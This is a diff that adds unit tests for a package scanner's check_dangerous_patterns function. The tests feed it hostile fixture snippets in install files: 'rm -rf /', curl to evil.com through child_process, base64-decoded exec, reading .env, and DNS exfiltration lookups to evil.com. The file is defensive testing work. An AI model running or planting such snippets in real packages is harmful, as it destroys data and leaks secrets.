@@ -124,6 +124,125 @@ class TestDangerousPatterns:
         signals = check_dangerous_patterns(files)
         assert any("HIGH" in s for s in signals)  # .pth = install file = HIGH
 
+    # --- S1: ctypes/importlib/getattr bypass detection ---
+    def test_ctypes_cdll_detected(self):
+        files = {"setup.py": "ctypes.CDLL('libevil.so')"}
+        signals = check_dangerous_patterns(files)
+        assert any("ctypes" in s.lower() or "CDLL" in s for s in signals)
+
+    def test_importlib_import_module_detected(self):
+        files = {"setup.py": "importlib.import_module('os')"}
+        signals = check_dangerous_patterns(files)
+        assert any("importlib" in s for s in signals)
+
+    def test_getattr_os_system_detected(self):
+        files = {"setup.py": "getattr(os, 'system')('rm -rf /')"}
+        signals = check_dangerous_patterns(files)
+        assert any("getattr" in s for s in signals)
+
+    def test_marshal_loads_detected(self):
+        files = {"setup.py": "marshal.loads(payload)"}
+        signals = check_dangerous_patterns(files)
+        assert any("marshal" in s for s in signals)
+
+    def test_child_process_detected(self):
+        files = {"postinstall.js": "require('child_process').exec('curl evil.com')"}
+        signals = check_dangerous_patterns(files)
+        assert any("child_process" in s for s in signals)
+
+    def test_process_binding_detected(self):
+        files = {"setup.js": "process.binding('spawn_sync')"}
+        signals = check_dangerous_patterns(files)
+        assert any("process.binding" in s or "binding" in s for s in signals)
+
+    def test_constructor_constructor_detected(self):
+        files = {"setup.js": "this.constructor.constructor('return process')()"}
+        signals = check_dangerous_patterns(files)
+        assert any("constructor" in s for s in signals)
+
+    def test_new_function_detected(self):
+        files = {"setup.js": "new Function('return this')()"}
+        signals = check_dangerous_patterns(files)
+        assert any("Function" in s or "new Function" in s for s in signals)
+
+    # --- S2: .pth file with bare import ---
+    def test_pth_bare_import_detected(self):
+        """Any .pth file should auto-generate a HIGH signal regardless of content."""
+        files = {"evil.pth": "import evil_module"}
+        signals = check_dangerous_patterns(files)
+        assert any("HIGH" in s for s in signals)
+
+    # --- S3: install_files set incomplete ---
+    def test_conftest_py_high_risk(self):
+        files = {"conftest.py": "exec(base64.b64decode(payload))"}
+        signals = check_dangerous_patterns(files)
+        assert any("HIGH" in s for s in signals)
+
+    def test_dunder_main_py_high_risk(self):
+        files = {"__main__.py": "os.system('curl evil.com')"}
+        signals = check_dangerous_patterns(files)
+        assert any("HIGH" in s for s in signals)
+
+    def test_makefile_high_risk(self):
+        files = {"Makefile": "os.system('rm -rf /')"}
+        signals = check_dangerous_patterns(files)
+        assert any("HIGH" in s for s in signals)
+
+    def test_cmakelists_high_risk(self):
+        files = {"CMakeLists.txt": "exec(compile(data, 'x', 'exec'))"}
+        signals = check_dangerous_patterns(files)
+        assert any("HIGH" in s for s in signals)
+
+    def test_prepare_js_high_risk(self):
+        files = {"prepare.js": "require('child_process').exec('curl evil.com')"}
+        signals = check_dangerous_patterns(files)
+        assert any("HIGH" in s for s in signals)
+
+    # --- S4: .env regex false positive on process.env ---
+    def test_process_env_no_false_positive(self):
+        """process.env.HOME should NOT trigger the .env pattern."""
+        files = {"main.js": "const home = process.env.HOME;"}
+        signals = check_dangerous_patterns(files)
+        assert not any(".env" in s and "dangerous_pattern" in s for s in signals)
+
+    def test_open_dotenv_detected(self):
+        """open('.env') SHOULD trigger the .env pattern."""
+        files = {"steal.py": "open('.env').read()"}
+        signals = check_dangerous_patterns(files)
+        assert any(".env" in s or "env" in s for s in signals)
+
+    # --- S5: DNS exfiltration detection ---
+    def test_dns_exfiltration_getaddrinfo(self):
+        files = {"setup.py": "socket.getaddrinfo(data + '.evil.com', 80)"}
+        signals = check_dangerous_patterns(files)
+        assert any("getaddrinfo" in s or "dns" in s.lower() for s in signals)
+
+    def test_dns_exfiltration_create_connection(self):
+        files = {"setup.py": "socket.create_connection(('evil.com', 80))"}
+        signals = check_dangerous_patterns(files)
+        assert any("create_connection" in s for s in signals)
+
+    def test_dns_resolver_detected(self):
+        files = {"setup.py": "dns.resolver.resolve(data + '.evil.com', 'A')"}
+        signals = check_dangerous_patterns(files)
+        assert any("dns" in s and "resolver" in s for s in signals)
+
+    # --- S6: process.exit / os._exit / os.kill ---
+    def test_process_exit_detected(self):
+        files = {"index.js": "process.exit(0)"}
+        signals = check_dangerous_patterns(files)
+        assert any("process.exit" in s or "exit" in s for s in signals)
+
+    def test_os_exit_detected(self):
+        files = {"setup.py": "os._exit(1)"}
+        signals = check_dangerous_patterns(files)
+        assert any("os._exit" in s or "_exit" in s for s in signals)
+
+    def test_os_kill_detected(self):
+        files = {"setup.py": "os.kill(pid, signal.SIGKILL)"}
+        signals = check_dangerous_patterns(files)
+        assert any("os.kill" in s or "kill" in s for s in signals)
+
 
 class TestHighEntropy:
     def test_normal_code(self):
